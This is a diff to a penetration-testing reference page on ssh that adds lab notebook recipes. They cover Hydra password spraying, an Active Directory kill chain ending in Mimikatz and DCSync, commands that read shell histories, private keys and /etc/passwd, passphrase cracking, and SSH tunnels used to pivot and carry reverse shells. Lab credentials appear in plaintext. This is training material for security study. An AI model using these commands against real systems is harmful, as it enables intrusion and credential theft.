@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=ssh) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -23,8 +25,436 @@ ssh -i id_rsa USER@TARGET_IP
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=ssh)
+## Notebook recipes
 
-## Learning and original examples
+30 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Linux Remote Access: SSH, Rsync, and R-Services](/enumeration/linux-remote-management-protocols-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="2. Password spraying">
+
+### 2. Password spraying
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# SSH spray (Hydra)
+hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
+#   -> [22][ssh] login: jbetty  password: Texas123!@#
+
+# SMB spray once internal (NetExec) — ONE password across users:
+nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
+
+### Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
+```
+
+</Accordion>
+
+<Accordion title="🗺️ The kill chain (this assessment)">
+
+### 🗺️ The kill chain (this assessment)
+
+**Active Directory Attack Path: Worked Lab**
+
+```text
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+</Accordion>
+
+<Accordion title="Files to Always Check">
+
+### Files to Always Check
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# History files (often contain passwords in commands)
+cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.viminfo
+
+# SSH keys
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+
+# Mail
+ls -la ~/Maildir/cur/
+cat ~/Maildir/cur/*
+ls -la ~/mail/
+
+# Other users
+cat /etc/passwd | grep -v nologin | grep -v false
+ls /home/
+
+# Find files by name
+find / -iname "*htb*" 2>/dev/null
+find / -iname "*password*" 2>/dev/null
+find / -iname "*config*" 2>/dev/null
+
+# Windows equivalents
+dir C:\Users
+type C:\Users\<user>\Desktop\flag.txt
+```
+
+</Accordion>
+
+<Accordion title="SSH (Port 22)">
+
+### SSH (Port 22)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Password login
+ssh <user>@<IP>
+
+# Key-based login
+chmod 600 id_rsa
+ssh -i id_rsa <user>@<IP>
+
+# If key has passphrase — crack it
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="SSH Key Predictable PRNG (Authorized_Keys) Process">
+
+### SSH Key Predictable PRNG (Authorized_Keys) Process
+
+**Linux Privilege Escalation: Full Checklist**
+
+```ps1
+ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
+```
+
+</Accordion>
+
+<Accordion title="Attacking SSH">
+
+### Attacking SSH
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+```
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crackable hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
+ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
+```
+
+</Accordion>
+
+<Accordion title="Key commands">
+
+### Key commands
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+ssh -v user@<IP>                                   # verbose: shows offered auth methods
+ssh -v user@<IP> -o PreferredAuthentications=password   # force password (for brute-force)
+ssh -i id_rsa user@<IP>                            # key-based (chmod 600 the key first)
+cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server config (if on host)
+```
+
+</Accordion>
+
+<Accordion title="SSH (22)">
+
+### SSH (22)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hydra -L user.list -P password.list ssh://10.129.42.197
+ssh user@10.129.42.197                  # log in once cracked
+```
+
+</Accordion>
+
+<Accordion title="Dynamic forwarding: -D">
+
+### Dynamic forwarding: -D
+
+**Pivoting Fundamentals: Routes, SOCKS, and Forwards**
+
+```bash
+ssh -D 9050 ubuntu@10.129.30.150
+```
+
+</Accordion>
+
+<Accordion title="Local forwarding: -L">
+
+### Local forwarding: -L
+
+**Pivoting Fundamentals: Routes, SOCKS, and Forwards**
+
+```bash
+ssh -L 1234:localhost:80 ubuntu@172.16.5.19
+```
+
+</Accordion>
+
+<Accordion title="1. SSH port forwarding (no tools needed)">
+
+### 1. SSH port forwarding (no tools needed)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Dynamic (-D): a SOCKS proxy → reach the WHOLE subnet via proxychains
+ssh -D 1080 jbetty@<DMZ_IP>
+#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; then:
+proxychains nxc smb 172.16.119.11 -u user -p pass
+
+# Local (-L): map ONE internal service to a Kali local port (great for RDP)
+ssh -L 13389:172.16.119.7:3389 jbetty@<DMZ_IP>
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychains
+
+# Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
+ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
+```
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Add  -fN  to background without a shell:  ssh -fN -D 1080 jbetty@&lt;DMZ_IP> .
+
+```text
+ssh -fN -D 1080 jbetty@<DMZ_IP>
+```
+
+</Accordion>
+
+<Accordion title="Dynamic port forwarding (-D) → SOCKS + proxychains">
+
+### Dynamic port forwarding (-D) → SOCKS + proxychains
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+```bash
+ssh -D 9050 ubuntu@pivot           # SOCKS5 proxy on your 127.0.0.1:9050
+# /etc/proxychains4.conf → last line:  socks5 127.0.0.1 9050
+proxychains -q nmap -sT -Pn 172.16.5.0/24
+```
+
+</Accordion>
+
+<Accordion title="Local port forwarding (-L)">
+
+### Local port forwarding (-L)
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+```bash
+ssh -L 8080:172.16.5.5:80 ubuntu@pivot   # your localhost:8080 → internal :80
+```
+
+</Accordion>
+
+<Accordion title="Remote / reverse port forwarding (-R) → for reverse shells">
+
+### Remote / reverse port forwarding (-R) → for reverse shells
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+```bash
+ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@pivot -vN
+```
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: ssh -R pivot_ip:8080:0.0.0.0:8000  forwards the pivot's  8080  → your handler on  8000 .
+
+```text
+ssh -R pivot_ip:8080:0.0.0.0:8000
+```
+
+</Accordion>
+
+<Accordion title="SSH tunneling">
+
+### SSH tunneling
+
+**Proxychains and SSH Tunnels**
+
+```bash
+ssh -D 1080 user@PIVOT              # dynamic SOCKS proxy
+ssh -L 8080:172.16.5.19:80 user@PIVOT   # local forward: your :8080 -> internal :80
+ssh -R 9001:127.0.0.1:9001 user@PIVOT   # remote forward (reach your box from inside)
+```
+
+</Accordion>
+
+<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
+
+### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: RDP over proxychains hangs / cancels SOCKS can't carry RDP's channels ligolo, or  ssh -L 13389:host:3389  then RDP to localhost
+
+```text
+ssh -L 13389:host:3389
+```
+
+</Accordion>
+
+<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+
+### Pulling files FROM the target to Kali (the hard direction)
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: ❌  proxychains impacket-smbserver  does  not  work. proxychains only proxies  outbound client  connections; an SMB  server needs to listen , which proxychains can't expose to the other side. To host a server reachable from inside, you need a  reverse forward  (ligolo  listener_add ,  ssh -R , chisel  R: ) — or just put the server on the DMZ host.
+
+```text
+ssh -R
+```
+
+</Accordion>
+
+<Accordion title="Three kinds of tunnel (pick the right tool)">
+
+### Three kinds of tunnel (pick the right tool)
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: SOCKS proxy A port on Kali (e.g. 1080); tools must be  proxy‑aware  (use  proxychains ) ssh -D , chisel  socks
+
+```text
+ssh -D
+```
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Port forward One specific  host:port  mapped to a local port; no proxychains needed ssh -L 13389:dc:3389
+
+```text
+ssh -L 13389:dc:3389
+```
+
+</Accordion>
+
+<Accordion title="🚨 THE MTU TRAP">
+
+### 🚨 THE MTU TRAP
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Keep  tun0  at 1200 for the whole engagement. Confirm with  ssh -v  — at 1500 it stalls right after  expecting SSH2_MSG_KEX_ECDH_REPLY ; at 1200 it sails through.
+
+```text
+ssh -v
+```
+
+</Accordion>
+
+<Accordion title="🧯 CAVEATS TABLE">
+
+### 🧯 CAVEATS TABLE
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: RDP over proxychains hangs /  ERRCONNECT_CONNECT_CANCELLED SOCKS can't carry RDP channels ssh -L  the 3389 port, or use ligolo
+
+```text
+ssh -L
+```
+
+</Accordion>
+
+<Accordion title="⏱️ DECISION HEADER — &quot;I need to… → do…&quot;">
+
+### ⏱️ DECISION HEADER — "I need to… → do…"
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: Reach a  whole subnet  through the pivot SSH  dynamic  → SOCKS + proxychains ssh -D 9050 user@pivot
+
+```text
+ssh -D 9050 user@pivot
+```
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: Reach  one internal service  on my localhost SSH  local  forward ssh -L 8080:10.0.0.5:80 user@pivot
+
+```text
+ssh -L 8080:10.0.0.5:80 user@pivot
+```
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: Get a  reverse shell out  of a segment that can't route to me SSH  remote  forward ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot
+
+```text
+ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot
+```
+
+</Accordion>
+
+<Accordion title="Linux Remote Access">
+
+### Linux Remote Access
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: SSH 22 Encrypted shell ssh &lt;user>@&lt;IP>
+
+```text
+ssh <user>@<IP>
+```
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: SSH (key-based) 22 Key auth ssh -i private.key &lt;user>@&lt;IP>
+
+```text
+ssh -i private.key <user>@<IP>
+```
+
+</Accordion>
+
+</AccordionGroup>
